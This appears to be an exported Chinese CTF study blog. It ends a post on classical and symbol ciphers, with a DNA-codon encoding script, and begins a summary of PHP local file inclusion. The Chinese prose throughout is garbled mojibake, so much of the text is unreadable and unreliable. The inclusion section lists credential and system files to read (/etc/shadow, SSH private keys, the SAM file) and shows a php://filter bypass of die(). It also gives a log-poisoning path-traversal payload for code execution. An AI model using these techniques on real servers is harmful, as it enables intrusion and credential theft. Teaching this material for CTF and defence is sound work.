<p><a href="https://wmich.edu/mus-theo/solfa-cipher/">solfa-cipher</a></p>
<h2 id="1-28-Code-Decabit"><a href="#1-28-Code-Decabit" class="headerlink" title="1.28 Code Decabit"></a>1.28 Code Decabit</h2><p>ç‰¹å¾ï¼šç”±<code>+</code>å’Œ<code>-</code>ç»„æˆï¼Œåä½ä¸€ç»„</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-<br></code></pre></td></tr></table></figure>

<p><a href="https://www.dcode.fr/code-decabit">Code Decabit</a></p>
<h2 id="1-29-DNAç¼–ç "><a href="#1-29-DNAç¼–ç " class="headerlink" title="1.29 DNAç¼–ç "></a>1.29 DNAç¼–ç </h2><p>ç‰¹å¾ï¼šç”±<code>ACGT</code>ç»„æˆ</p>
<p>åŠ è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span><br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment">## pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure>

<h2 id="1-30-Gronsfeld"><a href="#1-30-Gronsfeld" class="headerlink" title="1.30. Gronsfeld"></a>1.30. Gronsfeld</h2><p>æ ¼ç½—æ–¯è´¹å°”å¾·å¯†ç (Gronsfeld cipher)å®é™…ä¸Šå’Œç»´å‰å°¼äºšå¯†ç ç›¸åŒï¼Œé™¤äº†ä½¿ç”¨äº†æ•°å­—æ¥ä»£æ›¿å­—æ¯ä»¥å¤–æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚</p>
<p><a href="https://www.boxentriq.com/code-breaking/gronsfeld-cipher">åœ¨çº¿è§£å¯†</a></p>
<h1 id="å›¾å½¢å¯†ç "><a href="#å›¾å½¢å¯†ç " class="headerlink" title="å›¾å½¢å¯†ç "></a>å›¾å½¢å¯†ç </h1><p>è¿™ä¸€éƒ¨åˆ†è¾ƒç®€å•ï¼Œå¯¹ç€è¡¨ç¿»è¯‘å°±å¥½ï¼Œä½†ä¹Ÿæ¯”è¾ƒæŠ½è±¡ï¼Œå› ä¸ºæ—¶å¸¸ä¼šå‡ºç°å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿</p>
<h2 id="2-1-è·³èˆçš„å°äºº"><a href="#2-1-è·³èˆçš„å°äºº" class="headerlink" title="2.1. è·³èˆçš„å°äºº"></a>2.1. è·³èˆçš„å°äºº</h2><p>æ‰¾åˆ°äº†ä¸‰ç§ä¸åŒçš„è¡¨ï¼Œå°†å¯†æ–‡ä¸è¡¨ä¸€ä¸€å¯¹åº”å³å¯ï¼ˆå¥½åƒå‡ºè‡ªç¦å°”æ‘©æ–¯ï¼‰</p>
<p><img src="/img/summary/misc/tiaowuren-1.png"></p>
<p><img src="/img/summary/misc/tiaowuren-2.png"></p>
<p><img src="/img/summary/misc/tiaowuren-3.png"></p>
<h2 id="2-2-çŒªåœˆå¯†ç "><a href="#2-2-çŒªåœˆå¯†ç " class="headerlink" title="2.2. çŒªåœˆå¯†ç "></a>2.2. çŒªåœˆå¯†ç </h2><p><a href="http://moersima.00cha.net/zhuquan.asp">çŒªåœˆå¯†ç åœ¨çº¿è½¬æ¢</a></p>
<p><img src="/img/summary/misc/zhujuan.png"></p>
<p>ä»¥ä¸‹å‡ å¼ æ˜¯å˜ç§çŒªåœˆ</p>
<p><img src="/img/summary/misc/zhujuanbianzhong1.png"></p>
<p><img src="/img/summary/misc/zhujuanbianzhong2.png"></p>
<p><img src="/img/summary/misc/zhujuanbianzhong3.png"></p>
<h2 id="2-3-åœ£å ‚æ­¦å£«å¯†ç "><a href="#2-3-åœ£å ‚æ­¦å£«å¯†ç " class="headerlink" title="2.3. åœ£å ‚æ­¦å£«å¯†ç "></a>2.3. åœ£å ‚æ­¦å£«å¯†ç </h2><p>åœ£å ‚æ­¦å£«å¯†ç å…¶å®ä¹Ÿæ˜¯å˜ç§çŒªåœˆï¼Œä¸è¿‡æ¯”è¾ƒæœ‰å</p>
<p><img src="/img/summary/misc/shengtangwushi.jpg"></p>
<h2 id="2-4-é“¶æ²³å­—æ¯"><a href="#2-4-é“¶æ²³å­—æ¯" class="headerlink" title="2.4. é“¶æ²³å­—æ¯"></a>2.4. é“¶æ²³å­—æ¯</h2><p><img src="/img/summary/misc/yihezimu.jpg"></p>
<h2 id="2-5-å‡¹å‡¸å­—ä½“"><a href="#2-5-å‡¹å‡¸å­—ä½“" class="headerlink" title="2.5. å‡¹å‡¸å­—ä½“"></a>2.5. å‡¹å‡¸å­—ä½“</h2><p><img src="/img/summary/misc/aotu.jpg"></p>
<h2 id="2-6-å¤å¤šå¯†ç ï¼ˆæ›²æŠ˜å¯†ç ï¼‰"><a href="#2-6-å¤å¤šå¯†ç ï¼ˆæ›²æŠ˜å¯†ç ï¼‰" class="headerlink" title="2.6. å¤å¤šå¯†ç ï¼ˆæ›²æŠ˜å¯†ç ï¼‰"></a>2.6. å¤å¤šå¯†ç ï¼ˆæ›²æŠ˜å¯†ç ï¼‰</h2><p>æ¥æºï¼šä½œè€…éº¦å…‹æ–¯éŸ¦Â·æ ¼å…°ç‰¹åœ¨ä¸­ç¯‡å°è¯´ã€Šæ­»äº¡ä¹‹é“¾ã€‹å¡‘é€ å¤å¤šè¿™ä¸€è‹±é›„äººç‰©ä¸­æ‰€è‡ªåˆ›çš„å¯†ç <br>æ•´ä¸ªå¤å¤šå¯†ç ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œç è¡¨å’Œæ—‹è½¬æ–¹å‘</p>
<p><img src="/img/summary/misc/xiaoduo1.png"></p>
<p><img src="/img/summary/misc/xiaoduo2.png"></p>
<p>æœ€åå››ä¸ªç¬¦å·ï¼ˆ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼‰å¯ä»¥å‡ºç°åœ¨å¯†æ–‡ä¸­çš„ä»»æ„ä½ç½®ï¼Œå®ƒä»£è¡¨ç€åœ¨æ­¤ä¹‹åçš„å¯†æ–‡éœ€è¦å‘ä»€ä¹ˆæ–¹å‘æ—‹è½¬</p>
<h2 id="2-7-å¤åŸƒåŠè±¡å½¢æ–‡å­—"><a href="#2-7-å¤åŸƒåŠè±¡å½¢æ–‡å­—" class="headerlink" title="2.7. å¤åŸƒåŠè±¡å½¢æ–‡å­—"></a>2.7. å¤åŸƒåŠè±¡å½¢æ–‡å­—</h2><p><img src="/img/summary/misc/guaiji1.png"></p>
<p><img src="/img/summary/misc/guaiji2.png"></p>
<h2 id="2-8-è´¹å…¹è±¡å½¢æ–‡å­—"><a href="#2-8-è´¹å…¹è±¡å½¢æ–‡å­—" class="headerlink" title="2.8. è´¹å…¹è±¡å½¢æ–‡å­—"></a>2.8. è´¹å…¹è±¡å½¢æ–‡å­—</h2><p><img src="/img/summary/misc/feizixaingxingwenzi.png"></p>
<h2 id="2-9-Flag-Semaphoreæ——è¯­"><a href="#2-9-Flag-Semaphoreæ——è¯­" class="headerlink" title="2.9. FlagÂ Semaphoreæ——è¯­"></a>2.9. FlagÂ Semaphoreæ——è¯­</h2><p><img src="/img/summary/misc/qiyu.png"></p>
<h2 id="2-10-èˆ¹ç”¨ä¿¡å·æ——"><a href="#2-10-èˆ¹ç”¨ä¿¡å·æ——" class="headerlink" title="2.10. èˆ¹ç”¨ä¿¡å·æ——"></a>2.10. èˆ¹ç”¨ä¿¡å·æ——</h2><p><img src="/img/summary/misc/chuanyongxinhaoqi.png"></p>
<h2 id="2-11-Dvoraké”®ç›˜åŠ å¯†"><a href="#2-11-Dvoraké”®ç›˜åŠ å¯†" class="headerlink" title="2.11. Dvoraké”®ç›˜åŠ å¯†"></a>2.11. Dvoraké”®ç›˜åŠ å¯†</h2><blockquote>
<p>åˆ©ç”¨ä¸¤ç§é”®ç›˜å­—æ¯çš„æ’åˆ—é¡ºåºä¸åŒï¼Œè¿›è¡Œçš„ä¸€ç§æ›¿æ¢åŠ å¯†æ–¹å¼ã€‚</p>
</blockquote>
<p>Dvoraké”®ç›˜ï¼Œä¸­æ–‡åå­—æ˜¯å¾·æ²ƒå¤å…‹é”®ç›˜ï¼Œç”±å¥¥å¤æ–¯ç‰¹Â·å¾·æ²ƒå¤å…‹å’Œå¨å»‰Â·è¿ªåˆ©åœ¨1930å¹´ä»£æœŸé—´è®¾è®¡</p>
<p><img src="/img/summary/misc/Dvorak.png"></p>
<p><img src="/img/summary/misc/QWERTY.png"></p>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>å„ç§å¥‡å¥‡æ€ªæ€ªåˆæŠ½è±¡çš„å®åœ¨å¤ªå¤šäº†ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢ä¸¤ç¯‡æ–‡ç« ä¸­çš„å­—ç¬¦è¡¨<br><a href="https://www.cnblogs.com/Nuy0ah/p/16138118.html">https://www.cnblogs.com/Nuy0ah/p/16138118.html</a><br><a href="https://www.bilibili.com/read/cv19369626/">https://www.bilibili.com/read/cv19369626/</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>æ€»ç»“</tag>
        <tag>ç¼–ç </tag>
        <tag>å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ€»ç»“</title>
    <url>/posts/a3faee7a/</url>
    <content><![CDATA[<h1 id="åˆ©ç”¨å‡½æ•°"><a href="#åˆ©ç”¨å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡½æ•°"></a>åˆ©ç”¨å‡½æ•°</h1><p>å¸¸è§åˆ©ç”¨å‡½æ•°ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">includeï¼š æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚<br>include_onceï¼š å’Œinclude()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚<br>requireï¼š æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬ã€‚<br>require_onceï¼š å’Œrequire()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚<br><br>readfileï¼šè¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°<br>file_get_contentsï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­<br></code></pre></td></tr></table></figure>



<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>æ‰€åŒ…å«æ–‡ä»¶å†…å®¹ç¬¦åˆPHPè¯­æ³•è§„èŒƒï¼Œä»»ä½•æ‰©å±•åéƒ½å¯ä»¥è¢«PHPè§£æã€‚<br>æ‰€åŒ…å«æ–‡ä»¶å†…å®¹ä¸ç¬¦åˆPHPè¯­æ³•è§„èŒƒï¼Œä¼šæš´éœ²å…¶æºä»£ç ï¼ˆç›¸å½“äºæ–‡ä»¶è¯»å–ï¼‰ã€‚</p>
<h2 id="è¯»æ•æ„Ÿæ–‡ä»¶"><a href="#è¯»æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="è¯»æ•æ„Ÿæ–‡ä»¶"></a>è¯»æ•æ„Ÿæ–‡ä»¶</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Windowsï¼š<br>    C:\boot.ini                                           //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬<br>    C:\Windows\System32\inetsrv\MetaBase.xml              //IISé…ç½®æ–‡ä»¶<br>    C:\Windows\repair\sam                                 //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç <br>    C:\Program Files\mysql\my.ini                         //Mysqlé…ç½®<br>    C:\Program Files\mysql\data\mysql\user.MYD            //Mysql root<br>    C:\Windows\php.ini                                    //phpé…ç½®ä¿¡æ¯<br>    C:\Windows\my.ini                                     //Mysqlé…ç½®ä¿¡æ¯<br>    ...<br>Linuxï¼š<br>    /root/.ssh/authorized_keys<br>    /root/.ssh/id_rsa<br>    /root/.ssh/id_ras.keystore<br>    /root/.ssh/known_hosts<br>    /etc/passwd<br>    /etc/shadow<br>    /etc/my.cnf<br>    /etc/httpd/conf/httpd.conf<br>    /root/.bash_history<br>    /root/.mysql_history<br>    /proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)<br>    /proc/mounts<br>    /porc/config.gz<br></code></pre></td></tr></table></figure>


<h2 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h2><p><a href="https://www.php.net/manual/zh/wrappers.php">å®˜ç½‘ä¼ªåè®®æ‰‹å†Œ</a></p>
<h3 id="file-x2F-x2F-åè®®"><a href="#file-x2F-x2F-åè®®" class="headerlink" title="file:&#x2F;&#x2F;åè®®"></a>file:&#x2F;&#x2F;åè®®</h3><p><code>file://</code>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p>
<p>ä½¿ç”¨æ¡ä»¶ï¼š<code>allow_url_fopen=On/Offã€allow_url_include=On/Off</code></p>
<p><img src="/img/summary/file_include-1.png" alt="example"></p>
<blockquote>
<p>trick: å¯ä»¥ç”¨localhostä»£æ›¿&#x2F;</p>
</blockquote>
<h3 id="php-x2F-x2F-åè®®"><a href="#php-x2F-x2F-åè®®" class="headerlink" title="php:&#x2F;&#x2F;åè®®"></a>php:&#x2F;&#x2F;åè®®</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>ä½¿ç”¨æ¡ä»¶ï¼š<code>allow_url_fopen=On/Offã€allow_url_include=On/Off</code></p>
<p><img src="/img/summary/file_include-2.png" alt="example"></p>
<p><img src="/img/summary/file_include-5.png"></p>
<h5 id="php-x2F-x2F-filterç»•è¿‡æ­»äº¡die"><a href="#php-x2F-x2F-filterç»•è¿‡æ­»äº¡die" class="headerlink" title="php:&#x2F;&#x2F;filterç»•è¿‡æ­»äº¡die"></a>php:&#x2F;&#x2F;filterç»•è¿‡æ­»äº¡die</h5><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>rot13</code>ç­‰è½¬æ¢å™¨è¿›è¡Œç¼–ç </p>
<p><img src="/../../img/summary/file_include-6.png" alt="example"></p>
<h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>ä½¿ç”¨æ¡ä»¶ï¼š<code>allow_url_fopen=On/Offã€allow_url_include=On</code></p>
<p><code>enctype=&quot;multipart/form-data&quot;</code>(å³æ–‡ä»¶ä¸Šä¼ )çš„æ—¶å€™<code>php://input</code>æ˜¯æ— æ•ˆçš„ã€‚</p>
<p><img src="/../../img/summary/file_include-3.png" alt="example"></p>
<h3 id="data-x2F-x2F-åè®®"><a href="#data-x2F-x2F-åè®®" class="headerlink" title="data:&#x2F;&#x2F;åè®®"></a>data:&#x2F;&#x2F;åè®®</h3><p>ä½¿ç”¨æ¡ä»¶ï¼š<code>allow_url_include=Onã€allow_url_fopen=On</code></p>
<p>åˆ©ç”¨data:&#x2F;&#x2F;ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œphp:&#x2F;&#x2F;inputæ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†PHPä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ã€‚</p>
<p>ç”¨å¤§ç™½è¯è§£é‡Šå°±æ˜¯è¯´åŸæ¥includeåŒ…å«çš„æ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œå†å»è¯»å–é‡Œé¢çš„å†…å®¹ï¼Œdata:&#x2F;&#x2F;åè®®å°±ç›¸å½“äºä¸¤æ­¥è½¬ä¸ºä¸€æ­¥ï¼Œç›´æ¥è¯»å†…å®¹ï¼Œå¯ä»¥ç†è§£ä¸ºå°†includeè½¬ä¸ºeval</p>
<p>ç”¨æ³•ï¼š<code>data://text/plain;base64,</code></p>
<p>trickï¼šç¬¦åˆ<a href="http://www.faqs.org/rfcs/rfc2397.html">rfc2397</a>è§„èŒƒå³å¯</p>
<p><img src="/../../img/summary/file_include-7.png" alt="example"></p>
<h2 id="Nginxæ—¥å¿—åŒ…å«"><a href="#Nginxæ—¥å¿—åŒ…å«" class="headerlink" title="Nginxæ—¥å¿—åŒ…å«"></a>Nginxæ—¥å¿—åŒ…å«</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š<br>1ï¼šæœ‰æ–‡ä»¶åå¯æ§çš„æ–‡ä»¶åŒ…å«ç‚¹<br>2ï¼šæœ‰å¯ä»¥è®¿é—®åˆ°çš„æ—¥å¿—è·¯å¾„</p>
<p>linuxä¸‹æ—¥å¿—é»˜è®¤å­˜å‚¨ä½ç½®</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/var/log/nginx/access.log<br>/var/log/nginx/error_log<br></code></pre></td></tr></table></figure>

<p>åœ¨è®¿é—®æ—¶ä¿®æ”¹<code>User-Agent</code>å¤´ä¸º<code>php</code>ä»£ç ï¼ŒæˆåŠŸè®¿é—®åä¼šåœ¨æ—¥å¿—ä¸­è®°å½•ä¸‹æ¥</p>
<p><img src="/img/summary/file_include-8.png"></p>
<p><img src="/img/summary/file_include-9.png"></p>
<p>ç„¶ååŒ…å«æ—¥å¿—<code>?file=../../../../../var/log/nginx/access.log</code>ï¼Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœ</p>
<h2 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>ä¸´æ—¶æ–‡ä»¶åŒ…å«</h2><p>åœ¨ç»™<code>PHP</code>å‘é€<code>POST</code>æ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œ<code>PHP</code>éƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯<code>/tmp/php[6ä¸ªéšæœºå­—ç¬¦]</code>ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨<code>$_FILES</code>å˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚</p>
